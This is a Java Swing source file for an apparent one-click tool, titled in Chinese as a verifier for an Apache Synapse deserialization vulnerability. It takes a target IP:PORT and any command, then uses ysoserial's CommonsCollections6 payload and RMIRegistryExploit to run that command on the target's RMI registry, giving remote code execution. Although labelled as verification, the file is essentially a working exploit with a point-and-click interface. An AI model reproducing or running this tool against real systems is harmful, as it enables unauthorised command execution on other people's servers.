package fastexp;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import java.awt.event.*;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.swing.JTextField;
import  ysoserial.exploit.RMIRegistryExploit;
import ysoserial.payloads.CommonsCollections1;
import ysoserial.payloads.ObjectPayload;

public class Main  {
    public static void main(String[] args) {
        JFrame frame = new JFrame("Apache Synapse反序列化漏洞一键验证程序");
        frame.setSize(350, 200);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        JPanel panel = new JPanel();
        frame.add(panel);
        placeComponents(panel);
        frame.setVisible(true);
    }

    private static void placeComponents (JPanel panel) {
        panel.setLayout(null);
        final JLabel hostLab = new JLabel("Host( IP:PORT )");
        hostLab.setBounds(10,20,100,25);
        panel.add(hostLab);
        final JTextField hostText = new JTextField(20);
        hostText.setBounds(100,20,200,25);
        panel.add(hostText);

        final JLabel commandLab = new JLabel("Command");
        commandLab.setBounds(10,80,100,25);
        panel.add(commandLab);

        final JTextField commandText = new JTextField(20);
        commandText.setBounds(100,80,200,25);
        panel.add(commandText);

        JButton execBtn = new JButton("验证");
        execBtn.setBounds(220, 130, 80, 25);
        panel.add(execBtn);
        execBtn.addActionListener(
            new ActionListener(){
                public void actionPerformed (ActionEvent e) {
                    if(hostText.getText().equals("") || commandText.getText().equals("")){

                    }else{
                        try{
                            final String className = CommonsCollections1.class.getPackage().getName() +  ".CommonsCollections6";
                            final Class<? extends ObjectPayload> payloadClass = (Class<? extends ObjectPayload>) Class.forName(className);
                            String str[] = hostText.getText().split(":");
                            String ip = str[0];
                            String port = str[1];
                            System.out.println(ip+port);
                            final Registry registry = LocateRegistry.getRegistry(ip, Integer.parseInt(port));
                            String command = commandText.getText();
                            RMIRegistryExploit exp = new RMIRegistryExploit();
                            exp.exploit(registry,payloadClass,command);
                        }catch (Exception exept){
                            exept.printStackTrace();
                            System.exit(0);
                        }

                    }

                }
            });
    }
}
